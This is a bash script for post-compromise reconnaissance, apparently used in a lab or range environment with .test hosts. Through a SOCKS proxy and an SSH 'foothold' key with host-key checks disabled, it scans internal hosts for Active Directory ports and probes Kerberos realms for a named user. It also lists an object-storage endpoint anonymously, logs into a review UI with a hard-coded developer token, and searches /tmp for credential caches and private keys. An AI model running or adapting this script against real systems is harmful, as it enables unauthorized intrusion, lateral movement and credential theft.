#!/bin/bash
P="--socks5-hostname 127.0.0.1:1080"
H='ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180'
echo "===== AD-ish port scan from rowan-dev"
$H 'for t in 10.77.50.40 10.77.50.11 10.77.60.20; do echo "-- $t"; timeout 60 bash -c "for p in 22 53 88 135 139 389 445 464 636 3268 3269 3389 8080 8443 636; do (echo > /dev/tcp/$t/$p) >/dev/null 2>&1 && echo open:$p; done"; done' 2>/dev/null
echo "===== kerberos realm probes"
$H 'command -v kinit; echo -n "" | kinit mira.vale@ARWC.TEST 2>&1 | head -3; echo ---; echo -n "" | kinit mira.vale@KEPLEROPS.TEST 2>&1 | head -3; echo ---; klist 2>&1 | head -5' 2>/dev/null
echo "===== S3 anon buckets"
curl -sS $P -k -m 15 https://objects.keplerops.test/ | head -c 1200; echo
echo "===== preview review UI"
curl -sS $P -k -m 15 -u rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo -w '\n[%{http_code}]\n' https://preview.keplerops.test/review/ | head -c 1200
echo "===== preview app js"
for u in /review/index.js /review/app.js /static/index.js /index.js /review/index.css; do
  code=$(curl -sS $P -k -m 12 -u rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo -o /tmp/pj -w '%{http_code}' "https://preview.keplerops.test$u")
  echo "[$code] $u $(stat -c%s /tmp/pj) $(head -c 80 /tmp/pj | tr -d '\n')"
done
echo "===== box /tmp leftovers"
ls -la /tmp/*.ccache /tmp/*.crt /tmp/*.key /tmp/*.pem 2>/dev/null | head
ls -la /tmp/*.sh /tmp/*.txt /tmp/*.html 2>/dev/null | head -20
